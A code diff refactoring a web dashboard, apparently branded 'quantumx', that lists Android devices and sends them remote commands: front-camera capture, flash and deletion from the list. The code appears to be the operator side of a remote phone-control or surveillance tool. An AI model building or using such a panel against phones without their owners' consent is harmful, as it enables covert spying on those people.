-            captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengambil...';
-            
-            try {
-                // Send camera_start command
-                const startResponse = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer ' + token
-                    },
-                    body: JSON.stringify({ 
-                        command: 'camera_start',
-                        params: { camera: 'front' }
-                    })
-                });
-                
-                const startData = await startResponse.json();
-                
-                if (startData.success) {
-                    // Tunggu sebentar untuk camera ready
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                    
-                    // Send frame request
-                    await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': 'Bearer ' + token
-                        },
-                        body: JSON.stringify({ 
-                            command: 'camera_frame',
-                            params: {}
-                        })
-                    });
-                    
-                    showNotification('📸 Mengambil screenshot...', 'info');
-                    
-                    // Timeout 5 detik
-                    setTimeout(() => {
-                        if (captureBtn.disabled) {
-                            captureBtn.disabled = false;
-                            captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                            
-                            // Stop camera
-                            fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                    'Authorization': 'Bearer ' + token
-                                },
-                                body: JSON.stringify({ command: 'camera_stop' })
-                            }).catch(err => console.log('Stop camera error:', err));
-                            
-                            showNotification('❌ Timeout: No frame received', 'error');
-                        }
-                    }, 5000);
-                    
-                } else {
-                    captureBtn.disabled = false;
-                    captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                    showNotification('❌ Failed to start camera', 'error');
-                }
-                
-            } catch (error) {
-                console.error('Capture error:', error);
-                
-                // Try to stop camera
-                try {
-                    await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': 'Bearer ' + token
-                        },
-                        body: JSON.stringify({ command: 'camera_stop' })
-                    });
-                } catch (e) {}
-                
-                captureBtn.disabled = false;
-                captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
-                showNotification('❌ Error: ' + error.message, 'error');
-            }
-        }
-        
-        // ========== FLASH COMMAND ==========
-        async function sendFlashCommand() {
-            if (!currentDevice) {
-                showNotification('No device selected', 'error');
-                return;
-            }
-            
-            if (isCooldown) {
-                showNotification('Please wait for cooldown', 'warning');
-                return;
-            }
-            
-            const duration = parseInt(document.getElementById('flash-duration').value);
-            
-            if (!duration || duration < 1 || duration > 60) {
-                showNotification('Duration must be 1-60 seconds', 'warning');
-                return;
-            }
-            
-            try {
-                const response = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer ' + token
-                    },
-                    body: JSON.stringify({ 
-                        command: 'flash', 
-                        params: { duration: duration }
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    showNotification(`✅ Flash command sent (${duration}s)`, 'success');
-                    startCooldown(duration);
-                } else {
-                    showNotification('❌ Failed to send flash', 'error');
-                }
-                
-            } catch (error) {
-                showNotification('❌ Error: ' + error.message, 'error');
-            }
-        }
-        
-        // ========== DELETE DEVICE ==========
-        async function deleteDevice() {
-            if (!currentDevice) {
-                showNotification('No device selected', 'error');
-                return;
-            }
-            
-            const lastSeen = new Date(currentDevice.lastSeen || Date.now());
+        const total = allDevices.length;
+        const online = allDevices.filter(d => {
+            const lastSeen = new Date(d.lastSeen || Date.now());
             const now = new Date();
             const diffMinutes = (now - lastSeen) / (1000 * 60);
-            const isOnline = currentDevice.online && diffMinutes < 5;
-            
-            if (isOnline) {
-                showNotification('❌ Cannot delete: Device is still online', 'error');
-                return;
-            }
-            
-            if (!confirm('Device is offline. Are you sure you want to delete it?')) {
-                return;
-            }
-            
-            try {
-                deletedDevices.add(currentDevice.deviceId);
-                localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
-                
-                // Hapus dari semua storage
-                const index = devices.findIndex(d => d.deviceId === currentDevice.deviceId);
-                if (index !== -1) devices.splice(index, 1);
-                
-                if (wsDevices.has(currentDevice.deviceId)) {
-                    wsDevices.delete(currentDevice.deviceId);
-                }
-                
-                mergeAndRenderDevices();
-                updateStats();
-                closeModal();
-                
-                showNotification('✅ Device deleted permanently', 'success');
-                
-            } catch (error) {
-                console.error('Delete error:', error);
-                showNotification('❌ Error deleting device', 'error');
-            }
+            return d.online && diffMinutes < 5;
+        }).length;
+        
+        document.getElementById('total-devices').textContent = total;
+        document.getElementById('online-devices').textContent = online;
+    }
+    
+    // ========== MODAL ==========
+    function openDeviceModal(device) {
+        currentDevice = device;
+        
+        document.getElementById('modal-device-name').textContent = device.deviceName || device.deviceId;
+        document.getElementById('info-deviceid').textContent = device.deviceId;
+        document.getElementById('info-model').textContent = `${device.model || 'Unknown'}`;
+        document.getElementById('info-android').textContent = device.androidVersion || 'Unknown';
+        document.getElementById('info-battery').textContent = device.batteryLevel ? device.batteryLevel + '%' : 'Unknown';
+        document.getElementById('info-lastseen').textContent = new Date(device.lastSeen).toLocaleString();
+        
+        const lastSeen = new Date(device.lastSeen || Date.now());
+        const now = new Date();
+        const diffMinutes = (now - lastSeen) / (1000 * 60);
+        const isOnline = device.online && diffMinutes < 5;
+        document.getElementById('info-status').textContent = isOnline ? 'Online' : 'Offline';
+        
+        // Reset camera preview
+        resetCameraPreview();
+        
+        document.getElementById('flash-duration').value = 2;
+        document.getElementById('flash-duration').disabled = false;
+        document.getElementById('device-modal').classList.add('active');
+        
+        // Tutup semua section saat buka modal
+        document.getElementById('flash-content').classList.remove('expanded');
+        document.getElementById('flash-arrow').classList.remove('expanded');
+        document.getElementById('camera-content').classList.remove('expanded');
+        document.getElementById('camera-arrow').classList.remove('expanded');
+    }
+    
+    function closeModal() {
+        document.getElementById('device-modal').classList.remove('active');
+        currentDevice = null;
+    }
+    
+    // ========== CAMERA FUNCTIONS (FIXED) ==========
+    function resetCameraPreview() {
+        const cameraImage = document.getElementById('camera-image');
+        const placeholder = document.getElementById('preview-placeholder');
+        const status = document.getElementById('camera-status');
+        
+        cameraImage.style.display = 'none';
+        cameraImage.src = '';
+        placeholder.style.display = 'block';
+        status.innerHTML = '<i class="fas fa-info-circle"></i> Klik AMBIL untuk mengambil screenshot kamera depan';
+        status.className = 'camera-status';
+    }
+    
+    async function captureScreenshot() {
+        if (!currentDevice) {
+            showNotification('No device selected', 'error');
+            return;
         }
         
-        // ========== UI FUNCTIONS ==========
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('active');
-        }
+        const captureBtn = document.getElementById('capture-btn');
+        captureBtn.disabled = true;
+        captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengambil...';
         
-        function switchTab(tabName, element) {
-            document.querySelectorAll('.menu-item').forEach(item => {
-                item.classList.remove('active');
+        try {
+            // SATU COMMAND SAJA: 'camera' (bukan camera_start + camera_frame + camera_stop)
+            const response = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + token
+                },
+                body: JSON.stringify({ 
+                    command: 'camera',  // ✅ SATU COMMAND
+                    params: { camera: 'front' }
+                })
             });
-            element.classList.add('active');
             
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.style.display = 'none';
-            });
-            document.getElementById(tabName + '-tab').style.display = 'block';
+            const data = await response.json();
             
-            const titles = {
-                devices: 'Devices',
-                settings: 'Settings'
-            };
-            document.getElementById('page-title').textContent = titles[tabName];
-            
-            if (window.innerWidth <= 768) {
-                document.getElementById('sidebar').classList.remove('active');
+            if (data.success) {
+                showNotification('📸 Mengambil screenshot...', 'info');
+                
+                // Timeout 5 detik
+                setTimeout(() => {
+                    if (captureBtn.disabled) {
+                        captureBtn.disabled = false;
+                        captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                        showNotification('❌ Timeout: No frame received', 'error');
+                    }
+                }, 5000);
+                
+            } else {
+                captureBtn.disabled = false;
+                captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                showNotification('❌ Failed to capture', 'error');
             }
+            
+        } catch (error) {
+            console.error('Capture error:', error);
+            captureBtn.disabled = false;
+            captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+            showNotification('❌ Error: ' + error.message, 'error');
+        }
+    }
+    
+    // ========== FLASH COMMAND ==========
+    async function sendFlashCommand() {
+        if (!currentDevice) {
+            showNotification('No device selected', 'error');
+            return;
         }
         
-        function refreshData() {
-            loadDevices();
+        if (isCooldown) {
+            showNotification('Please wait for cooldown', 'warning');
+            return;
+        }
+        
+        const duration = parseInt(document.getElementById('flash-duration').value);
+        
+        if (!duration || duration < 1 || duration > 60) {
+            showNotification('Duration must be 1-60 seconds', 'warning');
+            return;
+        }
+        
+        try {
+            const response = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + token
+                },
+                body: JSON.stringify({ 
+                    command: 'flash', 
+                    params: { duration: duration }
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                showNotification(`✅ Flash command sent (${duration}s)`, 'success');
+                startCooldown(duration);
+            } else {
+                showNotification('❌ Failed to send flash', 'error');
+            }
+            
+        } catch (error) {
+            showNotification('❌ Error: ' + error.message, 'error');
+        }
+    }
+    
+    // ========== DELETE DEVICE ==========
+    async function deleteDevice() {
+        if (!currentDevice) {
+            showNotification('No device selected', 'error');
+            return;
+        }
+        
+        const lastSeen = new Date(currentDevice.lastSeen || Date.now());
+        const now = new Date();
+        const diffMinutes = (now - lastSeen) / (1000 * 60);
+        const isOnline = currentDevice.online && diffMinutes < 5;
+        
+        if (isOnline) {
+            showNotification('❌ Cannot delete: Device is still online', 'error');
+            return;
+        }
+        
+        if (!confirm('Device is offline. Are you sure you want to delete it?')) {
+            return;
+        }
+        
+        try {
+            deletedDevices.add(currentDevice.deviceId);
+            localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
+            
+            // Hapus dari semua storage
+            const index = devices.findIndex(d => d.deviceId === currentDevice.deviceId);
+            if (index !== -1) devices.splice(index, 1);
+            
+            if (wsDevices.has(currentDevice.deviceId)) {
+                wsDevices.delete(currentDevice.deviceId);
+            }
+            
+            mergeAndRenderDevices();
             updateStats();
-            showNotification('Data refreshed', 'success');
+            closeModal();
+            
+            showNotification('✅ Device deleted permanently', 'success');
+            
+        } catch (error) {
+            console.error('Delete error:', error);
+            showNotification('❌ Error deleting device', 'error');
         }
+    }
+    
+    // ========== UI FUNCTIONS ==========
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('active');
+    }
+    
+    function switchTab(tabName, element) {
+        document.querySelectorAll('.menu-item').forEach(item => {
+            item.classList.remove('active');
+        });
+        element.classList.add('active');
         
-        function logout() {
-            stopKeepAlive();
-            if (socket) socket.disconnect();
-            localStorage.removeItem('quantumx_token');
-            localStorage.removeItem('quantumx_user');
-            window.location.href = 'login.html';
+        document.querySelectorAll('.tab-content').forEach(tab => {
+            tab.style.display = 'none';
+        });
+        document.getElementById(tabName + '-tab').style.display = 'block';
+        
+        const titles = {
+            devices: 'Devices',
+            settings: 'Settings'
+        };
+        document.getElementById('page-title').textContent = titles[tabName];
+        
+        if (window.innerWidth <= 768) {
+            document.getElementById('sidebar').classList.remove('active');
         }
-        
-        document.addEventListener('click', function(e) {
-            const modal = document.getElementById('device-modal');
-            if (e.target === modal) {
-                closeModal();
-            }
-        });
-        
-        document.getElementById('flash-duration')?.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && !isCooldown) {
-                sendFlashCommand();
-            }
-        });
-    </script>
+    }
+    
+    function refreshData() {
+        loadDevices();
+        updateStats();
+        showNotification('Data refreshed', 'success');
+    }
+    
+    function logout() {
+        stopKeepAlive();
+        if (socket) socket.disconnect();
+        localStorage.removeItem('quantumx_token');
+        localStorage.removeItem('quantumx_user');
+        window.location.href = 'login.html';
+    }
+    
+    document.addEventListener('click', function(e) {
+        const modal = document.getElementById('device-modal');
+        if (e.target === modal) {
+            closeModal();
+        }
+    });
+    
+    document.getElementById('flash-duration')?.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter' && !isCooldown) {
+            sendFlashCommand();
+        }
+    });
+</script>
 </body>
 </html>
-
